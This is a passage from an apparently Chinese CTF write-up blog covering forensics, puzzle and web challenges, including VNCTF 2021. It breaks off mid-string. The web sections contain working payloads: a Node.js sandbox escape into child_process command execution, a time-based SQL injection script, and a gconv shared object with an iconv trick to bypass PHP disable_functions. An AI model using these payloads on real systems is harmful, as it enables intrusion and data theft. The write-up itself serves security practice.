class="hljs-built_in">recvline</span>())    (x,y) = <span class="hljs-built_in">process</span>(data)    W = np.<span class="hljs-built_in">poly1d</span>(np.<span class="hljs-built_in">polyfit</span>(x,y,<span class="hljs-number">10</span>))    <span class="hljs-built_in">print</span>(W)    p.<span class="hljs-built_in">recvline</span>()    p.<span class="hljs-built_in">sendline</span>()    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):        information = p.<span class="hljs-built_in">recvline</span>()        xi = <span class="hljs-built_in">float</span>(re.<span class="hljs-built_in">compile</span>(b<span class="hljs-string">&#x27;When x=([0-9\.]+),y=?&#x27;</span>).<span class="hljs-built_in">findall</span>(information)[<span class="hljs-number">0</span>])        p.<span class="hljs-built_in">sendline</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">W</span>(xi)))        <span class="hljs-built_in">print</span>(xi,<span class="hljs-built_in">W</span>(xi))    p.<span class="hljs-built_in">interactive</span>()</code></pre></div><h3 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h3><p>pslist   找到</p><blockquote><p>notepad.exe pid 3552<br>TrueCrypt.exe pid 3364(磁盘加密工具)<br>mspaint.exe pid 2648(画图工具)</p></blockquote><div class="code-wrapper"><pre><code class="hljs stylus">-f mem<span class="hljs-selector-class">.raw</span> <span class="hljs-attr">--profile</span>=Win7SP1x86_23418 memdump -<span class="hljs-selector-tag">p</span> <span class="hljs-number">3552</span> -D ./</code></pre></div><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205141419.png" alt="image-20231023205141419"></p><p>notepad分析找到下载链接</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205230889.png" alt="image-20231023205230889"></p><p>mspaint.exe利用GIMP   把图像偏移对其</p><p>最后是TrueCrypt.exe使用EFDD进行挂载</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205349780.png" alt="image-20231023205349780"></p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205523512.png" alt="image-20231023205523512"></p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205537572.png" alt="image-20231023205537572"></p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205556752.png" alt="image-20231023205556752"></p><p>最后使用<code>VeraCrypt</code></p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023205746871.png" alt="image-20231023205746871"></p><h3 id="Final-Game"><a href="#Final-Game" class="headerlink" title="Final Game"></a>Final Game</h3><p>得到一个vmdk镜像文件和一个加密的压缩包</p><p>压缩包注释</p><div class="code-wrapper"><pre><code class="hljs mel">Stupid mortal, you must enter the eighth <span class="hljs-keyword">circle</span> of Hell to get the Tip of god。<span class="hljs-string">&#x27;=B;:?8\&lt;;:921Uv.3,1*No&#x27;</span>&amp;J*)iF~%$#zy?w|&#123;zsr8pun4rTji/PONMLKJIHGFEDCBA@?&gt;=&lt;;:<span class="hljs-number">987</span>SRQ3IHMFKDCBf)(<span class="hljs-string">&#x27;&amp;%$#&quot;!~&#125;|&#123;zyxwvutsrqpon,+*)i&#x27;</span>&amp;%$&#123;zy?&#125;|&#123;t:xwp6Wsrkj0QPONMLKJIHGFEDCBA@VUTYXWVUTSRKoON0LKDCgfS</code></pre></div><p>the eighth circle of Hell      神曲     Malebolge</p><p><a href="http://malbolge.doleczek.pl/">Malbolge - interpreter online (doleczek.pl)</a></p><p>运行得到<code>%&amp;^&amp;#@()(*:&quot;;&#39;/,,</code></p><p>解密压缩包得到提示</p><div class="code-wrapper"><pre><code class="hljs brainfuck"><span class="hljs-comment">神说：要有ELF！！！</span><span class="hljs-comment">神说：要有WORD！！！</span><span class="hljs-comment">神说：要有NTFS！！！</span><span class="hljs-comment">神说：要有PDF！！！</span><span class="hljs-comment">神说：要有OSZ！！！</span><span class="hljs-comment">地狱</span> <span class="hljs-literal">--</span> <span class="hljs-comment">炼狱</span> <span class="hljs-literal">--</span> <span class="hljs-comment">天堂</span></code></pre></div><p>7z打开vmdk，按时间排序，发现</p><div class="code-wrapper"><pre><code class="hljs moonscript">Windows7_by_Lamber.vmdk\Users\lenovo\Documents\Purgatory.zip Windows7_by_Lamber.vmdk\Users\lenovo\Desktop\Door.png Windows7_by_Lamber.vmdk\Users\lenovo\Music\paradise.zip Windows7_by_Lamber.vmdk\Users\lenovo\Downloads\proverbs.pdf</code></pre></div><p><code>dir /r</code>，可以看到在<code>Door.png</code>这个文件后隐藏有exe文件，用工具<strong>ntfsstreameditor</strong>将其提取出来，得到<code>Purgatory.exe</code>这个文件</p><p>执行得到一句话</p><div class="code-wrapper"><pre><code class="hljs reasonml">请将该文件放入炼狱中执行（能进入天堂的是<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Mr</span>.</span></span>png，<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Mrs</span>.</span></span>jpg只能下地狱）</code></pre></div><p>需要与<code>Windows7_by_Lamber.vmdk\Program Files (x86)\Linux\Purgatorio</code>文件放在一起运行</p><p><code>Purgatorio</code>这个单词的意思，正是意大利语的<code>炼狱</code></p><p>运行得到</p><div class="code-wrapper"><pre><code class="hljs">智慧之神evoA说，你需要修复ELF</code></pre></div><p>使用010editor修改<code>Purgatorio</code>文件头</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023212419041.png" alt="image-20231023212419041"></p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023212430993.png" alt="image-20231023212430993"></p><p>输入evoA</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023212457530.png" alt="image-20231023212457530"></p><div class="code-wrapper"><pre><code class="hljs dns"><span class="hljs-number">30</span>e308e8e7122579b8ea2fae<span class="hljs-number">774d1999</span>解md5也可以得到evoA</code></pre></div><p><code>pdfkG@0zl_3ptmVPfa7LHuB8rs#cRdi$</code>，为pdf开头，推测为此pdf文件的密码，输入后打开了pdf文件</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023212544665.png" alt="image-20231023212544665"></p><p>键盘密码</p><div class="code-wrapper"><pre><code class="hljs applescript">The password <span class="hljs-keyword">of</span> <span class="hljs-built_in">word</span> <span class="hljs-keyword">is</span> capital(PROVERBS OF GOD)</code></pre></div><p>得到docm文件，百度可知docm文件为<strong>一种包含宏或启用了宏的文档</strong>，用word打开后查看宏：<strong>ALT+F8</strong>，可以看到有名为<strong>LargeSB</strong>的宏（大写字母即为<strong>LSB</strong>）</p><p>运行宏得到大量base64字符串 （一眼base64隐写）</p><div class="code-wrapper"><pre><code class="hljs gcode">Hidde<span class="hljs-symbol">n1</span><span class="hljs-symbol">nWord_</span></code></pre></div><p>再看word文档的内容，为大量的16进制，<code>FF D8 FF E0 0D 0A 1A 0A</code>开头，但不是<code>FF D9</code>结尾，而<code>89 50 4E 47 0D 0A 1A 0A</code>又是PNG的文件头，所以推测其为被修改了文件头的PNG文件，将文件头改回来后python写入文件，得到PNG图片</p><p>推测该PNG为需要密钥的LSB隐写，密钥为<code>Hidden1nWord_</code>，用脚本解密，得到内容如下</p><div class="code-wrapper"><pre><code class="hljs erlang-repl">The password of paradise:Bliss_Syc!!!!</code></pre></div><p>解压后得到osz文件，百度可知这种文件和游戏<code>osu!</code>相关，下载游戏后用游戏打开这个osz文件，发现是个可以玩的图，将这个osz文件拖进kali中，发现可以解压，解压后可以看到一个<strong>readme.jpg</strong>的文件，strings查看这个文件，在最后可以看到一些可读的数字和字符</p><div class="code-wrapper"><pre><code class="hljs dns">in,map.flag,is :<span class="hljs-number">0036112</span>S0038362y0042<span class="hljs-number">112c0055162</span>&#123;<span class="hljs-number">0110912</span><span class="hljs-number">0118712</span><span class="hljs-number">0135512</span><span class="hljs-number">0142112</span><span class="hljs-number">0158163</span><span class="hljs-number">0200412</span><span class="hljs-number">0203862</span><span class="hljs-number">0216312</span><span class="hljs-number">0219762</span><span class="hljs-number">0225312</span><span class="hljs-number">0231312</span><span class="hljs-number">0251862</span><span class="hljs-number">0302512</span><span class="hljs-number">0312112</span><span class="hljs-number">0318412</span><span class="hljs-number">0329628</span>...</code></pre></div><p>每一行数字都对应一个时间，这个时间在游戏的图中对应了flag的一个字符，比如给出的例子，在这些数字的结尾也给了相应提示：<strong>Traversing.Time</strong></p><h1 id="v-n-2021-（）"><a href="#v-n-2021-（）" class="headerlink" title="v&amp;n 2021   （）"></a>v&amp;n 2021   （）</h1><p>[VNCTF2021<a href="https://blog.csdn.net/solitudi/article/details/114949206">WEB]_s52g50pytxr6.xyz-CSDN博客</a>      Y4tacker师傅太强了</p><h2 id="EZ-game"><a href="#EZ-game" class="headerlink" title="EZ_game"></a>EZ_game</h2><p>修改数值开挂硬玩通关即可</p><p>修改  winTime.endtime&#x3D;任意  即可</p><p>中间有很明显的一长串 [sojson.v4]的加密，拿到在线网站解就行</p><p>在控制台的话   要先把开头结尾的sojson.v4去掉</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023200739259.png" alt="image-20231023200739259"></p><h2 id="naive"><a href="#naive" class="headerlink" title="naive"></a>naive</h2><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;express&quot;</span>;<span class="hljs-keyword">import</span> bindings <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;bindings&quot;</span>;<span class="hljs-keyword">import</span> &#123; fileURLToPath &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;url&#x27;</span><span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;path&quot;</span>;<span class="hljs-keyword">import</span> pkg <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;expression-eval&#x27;</span>;<span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">eval</span>: eval_, parse &#125; = pkg;<span class="hljs-keyword">const</span> addon = <span class="hljs-title function_">bindings</span>(<span class="hljs-string">&quot;addon&quot;</span>);<span class="hljs-keyword">const</span> file = <span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>);<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;));app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&quot;static&quot;</span>));app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/eval&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;  <span class="hljs-keyword">const</span> e = req.<span class="hljs-property">body</span>.<span class="hljs-property">e</span>;  <span class="hljs-keyword">const</span> code = req.<span class="hljs-property">body</span>.<span class="hljs-property">code</span>;  <span class="hljs-keyword">if</span> (!e || !code) &#123;    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;wrong?&quot;</span>);    <span class="hljs-keyword">return</span>;  &#125;  <span class="hljs-keyword">try</span> &#123;    <span class="hljs-keyword">if</span> (addon.<span class="hljs-title function_">verify</span>(code)) &#123;      res.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">String</span>(eval_(<span class="hljs-title function_">parse</span>(e))));    &#125; <span class="hljs-keyword">else</span> &#123;      res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;wrong?&quot;</span>);    &#125;  &#125; <span class="hljs-keyword">catch</span> (e) &#123;    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e)    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;wrong?&quot;</span>);  &#125;&#125;);app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/source&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;  <span class="hljs-keyword">let</span> p = req.<span class="hljs-property">query</span>.<span class="hljs-property">path</span> || file;  p = path.<span class="hljs-title function_">resolve</span>(path.<span class="hljs-title function_">dirname</span>(file), p);  <span class="hljs-keyword">if</span> (p.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;flag&quot;</span>)) &#123;    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;no flag!&quot;</span>);  &#125; <span class="hljs-keyword">else</span> &#123;    res.<span class="hljs-title function_">sendFile</span>(p);  &#125;&#125;);app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">err, req, res, next</span>) =&gt;</span> &#123;  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err)  res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;index.html&quot;</span>);&#125;);app.<span class="hljs-title function_">listen</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">80</span>);</code></pre></div><p>任意文件读取、命令执行（但要通过<code>addon.verify(code)</code>）</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023224558055.png" alt="image-20231023224558055"></p><p>可以看出bindings(“addon”);会引入build&#x2F;Release&#x2F;addon.node里面的包，因此我们配合上面文件下载，访问</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">source</span>?path=../build/Release/addon.node</code></pre></div><p>据说逆向得到<code>yoshino-s_want_a_gf,qq1735439536</code></p><p>利用 <code>res.send(String(eval_(parse(e))));</code>去实现任意命令的执行了，</p><p>(1).constructor.constructor可以拿到Funtion从而实现自定义匿名函数（没怎么做过nodejs的题，好像都是两次constructor拿到Function即可）</p><p>常规payload：</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">code</span>=yoshi<span class="hljs-literal">no</span>-s_want_a_gf,qq1735439536&amp;e=(<span class="hljs-number">1</span>).constructor.constructor(<span class="hljs-string">&quot;return require(&#x27;child_process&#x27;).execSync(\&quot;whoami\&quot;).toString();&#125;)&quot;</span>)()<span class="hljs-comment">;</span></code></pre></div><p>后来几经波折发现在package.json<code>/source?path=../package.json</code>当中有一行<code>&quot;type&quot;: &quot;module&quot;</code>这也是本题的关键所在</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023225409500.png" alt="image-20231023225409500"></p><p>当type字段指定值为<strong>module</strong>则采用ESModule规范</p><p>ES6不是CommonJS，因此不可以使用require导入，这就是前面代码执行异常的原因</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023225646835.png" alt="image-20231023225646835"></p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231023225843143.png" alt="image-20231023225843143"></p><p>动态加载模块</p><div class="code-wrapper"><pre><code class="hljs arcade">code=yoshino-s_want_a_gf,qq1735439536&amp;e=<span class="hljs-function">(<span class="hljs-params"><span class="hljs-number">1</span></span>).<span class="hljs-params">constructor</span>.<span class="hljs-params">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return import(&#x27;child_process&#x27;).then((module)=&gt;&#123;module.execSync(\&quot;whoami\&quot;).toString();&#125;)&quot;</span></span>)<span class="hljs-params">()</span>;</span></code></pre></div><p>我们知道nodejs支持设置静态目录从而实现直接访问，在源码当中我们发现</p><div class="code-wrapper"><pre><code class="hljs fsharp">app.<span class="hljs-keyword">use</span>(express.<span class="hljs-keyword">static</span>(<span class="hljs-string">&quot;static&quot;</span>));</code></pre></div><p>因此把结果写入static目录下</p><div class="code-wrapper"><pre><code class="hljs arcade">code=yoshino-s_want_a_gf,qq1735439536&amp;e=<span class="hljs-function">(<span class="hljs-params"><span class="hljs-number">1</span></span>).<span class="hljs-params">constructor</span>.<span class="hljs-params">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return+import(&#x27;child_process&#x27;).then((module)=&gt;&#123;module.execSync(\&quot;cat ../flag&gt;&gt; ./static/4.js\&quot;);&#125;)&quot;</span></span>)<span class="hljs-params">()</span>;</span></code></pre></div><p>最后访问</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">1</span>adff864-<span class="hljs-number">6</span>d0f-<span class="hljs-number">49</span>d3-<span class="hljs-number">8127</span>-db3e6f1b1167.node3.buuoj.cn/<span class="hljs-number">4</span>.js</code></pre></div><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><div class="code-wrapper"><pre><code class="hljs abnf">const addon <span class="hljs-operator">=</span> bindings(<span class="hljs-string">&quot;addon&quot;</span>)<span class="hljs-comment">;</span></code></pre></div><p>会引入<code>../build/Release/addon.node</code></p><div class="code-wrapper"><pre><code class="hljs gradle"><span class="hljs-regexp">/source?path=../</span><span class="hljs-keyword">package</span>.json</code></pre></div><p>查看package.json发现是ES6规范，使用import进行动态加载模块</p><h2 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h2><p>登陆页面，在password使用笛卡尔积进行盲注 </p><p>（select * from A,B）利用数据过多产生延时的效果</p><div class="code-wrapper"><pre><code class="hljs stan">import requestsimport timeurl = <span class="hljs-string">&quot;http://192.168.0.104:8080/user/login&quot;</span>i = <span class="hljs-number">0</span>flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">while</span> True :    i += <span class="hljs-number">1</span>    <span class="hljs-built_in">head</span> = <span class="hljs-number">32</span>    <span class="hljs-built_in">tail</span> = <span class="hljs-number">126</span>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span> :        mid = <span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span> &gt;&gt; <span class="hljs-number">1</span>        payload = <span class="hljs-string">&quot;a&#x27; or (if(ascii(substr(password,%d,1))&gt;%d,(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,information_schema.columns/**/B,information_schema.tables/**/C),1))#&quot;</span> % (i,mid)        <span class="hljs-title">data</span> = &#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span> , <span class="hljs-string">&quot;password&quot;</span> : payload&#125;           start_time = time.time()        r = requests.post(url,<span class="hljs-title">data</span> = <span class="hljs-title">data</span>)        <span class="hljs-built_in">print</span>(<span class="hljs-title">data</span>[&#x27;password&#x27;])        end_time = time.time()        <span class="hljs-keyword">if</span> end_time - start_time &gt; <span class="hljs-number">3</span>:            <span class="hljs-built_in">head</span> = mid + <span class="hljs-number">1</span>        <span class="hljs-keyword">else</span> :            <span class="hljs-built_in">tail</span> = mid    <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span>!=<span class="hljs-number">32</span>:        flag += chr(<span class="hljs-built_in">head</span>)        <span class="hljs-built_in">print</span>(flag)    <span class="hljs-keyword">else</span> :        <span class="hljs-keyword">break</span></code></pre></div><p>最后得到密码是<code>no_0ne_kn0w_th1s</code>  （运行了一下，是真的难）<br>登陆后创建角色以后，发现隐藏路由<code>searchimage路由可以任意文件读取</code>，因为是spring项目所以我们尝试去读取pom.xml，拼接<code>searchimage?img=../../../../../pom.xml</code>  （一个不多、一个不少）</p><p>能找到fastjson1.2.27的依赖，但是要用1.2.47的绕过来打</p><p>&#x2F;create路由有</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">roleJson</span>=&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;</code></pre></div><p>配合看到的依赖，就是fastjson反序列化 </p><p>直接jdbcrowsetImpl</p><h2 id="Easy-laravel"><a href="#Easy-laravel" class="headerlink" title="Easy_laravel"></a>Easy_laravel</h2><p>。。。简直是神仙题目</p><p>Laravel Debug Rce   由于源码中对一些已公开的pop链做了修改。并且php版本为7.4没有assert、web目录只有session和log目录有写权限。需要自己挖一个eval的POP链。</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172058873.png" alt="image-20231024172058873"></p><p>漏洞的路由</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172410335.png" alt="image-20231024172410335"></p><p>写一个phar在logs下，一直调用phar反序列化。eval执行代码</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172251893.png" alt="image-20231024172251893"></p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172518027.png" alt="image-20231024172518027"></p><p>调用phpinfo()发现有disable_funciton和open_basedir，发现禁用其他函数。但是可以用global协议查看根目录</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172750973.png" alt="image-20231024172750973"></p><p>原生类遍历根目录</p><p>发现有&#x2F;readflag。可以用伪协议触发iconv bypass disable_function</p><p>生成so</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><span class="hljs-comment">#include &lt;stdlib.h&gt;</span>void gconv() &#123;&#125;void gconv_init() &#123;  system(<span class="hljs-string">&quot;/readflag &gt; /tmp/flag&quot;</span>);  <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;gcc payload.c -o payload.so -shared -fPI</code></pre></div><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024172948143.png" alt="image-20231024172948143"></p><div class="code-wrapper"><pre><code class="hljs reasonml">file<span class="hljs-constructor">_put_contents(&#x27;<span class="hljs-params">php</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">filter</span><span class="hljs-operator">/</span><span class="hljs-params">write</span>=<span class="hljs-params">convert</span>.<span class="hljs-params">iconv</span>.<span class="hljs-params">payload</span>.<span class="hljs-params">utf</span>-8<span class="hljs-operator">/</span><span class="hljs-params">resource</span>=<span class="hljs-operator">/</span><span class="hljs-params">tmp</span><span class="hljs-operator">/</span><span class="hljs-params">guoke</span>&#x27;,123)</span>;file<span class="hljs-constructor">_get_contents(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">tmp</span><span class="hljs-operator">/</span><span class="hljs-params">file</span>&#x27;)</span>;</code></pre></div><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024173115630.png" alt="image-20231024173115630"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="冰冰好像藏着秘密"><a href="#冰冰好像藏着秘密" class="headerlink" title="冰冰好像藏着秘密"></a>冰冰好像藏着秘密</h3><p>FFT （傅里叶变换）</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<span class="hljs-keyword">import</span> cv2 <span class="hljs-keyword">as</span> cv<span class="hljs-keyword">from</span> matplotlib <span class="hljs-keyword">import</span> pyplot <span class="hljs-keyword">as</span> pltimg = cv.imread(<span class="hljs-string">&#x27;1.bmp&#x27;</span>, <span class="hljs-number">0</span>)f = np.fft.fft2(img)logf = <span class="hljs-number">20</span>*np.log(np.abs(f))plt.imshow(logf, <span class="hljs-string">&#x27;gray&#x27;</span>)plt.<span class="hljs-keyword">show</span>()</code></pre></div><p>但是图片无法看清</p><h3 id="interesting-fishing"><a href="#interesting-fishing" class="headerlink" title="interesting_fishing"></a>interesting_fishing</h3><p>附件拿到注释.txt  和bin文件</p><div class="code-wrapper"><pre><code class="hljs sqf">crazyman_army是某安全公司的研究人员这天他的其邮箱里发现了一封奇怪的邮件 你能帮助他找到其隐藏的信息吗注意:附件是第一部分的<span class="hljs-built_in">flag</span>图片是第二部分的<span class="hljs-built_in">flag</span>最后<span class="hljs-built_in">flag</span>为 第一部分+第二部分<span class="hljs-built_in">hint</span>:powershell解码后的字符可能存在不可读的情况 那并不是解码错误</code></pre></div><p>根据提示修改bin文件后缀为eml文件，并用foxmail打开</p><p><img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024203239673.png" alt="image-20231024203239673"></p><p>把rar和图片都保存下来</p><p><code>ThisIsSecret.jpg</code>  猜测outsecret，  无密码解出后半段flag   </p><div class="code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-symbol">_fr0m_l@</span><span class="hljs-symbol">z@</span>RuS&#125;</code></pre></div><p>rar在myproject\giveyourflag\giveyourflag\x64\Debug目录下有Browse.VC.db</p><p>但解压下来后不见，</p><p>关闭<img src="/../images/%E5%B7%B2%E5%8F%91%E7%94%9F%E7%9A%84%E6%AF%94%E8%B5%9B%E5%88%B7%E9%A2%98/image-20231024203704327.png" alt="image-20231024203704327"></p><p>打开</p><div class="code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$encodestring</span> = <span class="hljs-string">&quot;XAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQANwA4AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAMQA4AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAAzAD8AXAB1AC0ANgA1ADQAOAAxAD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAOAAyAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAwAD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgAzAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA5AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQANQA2AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0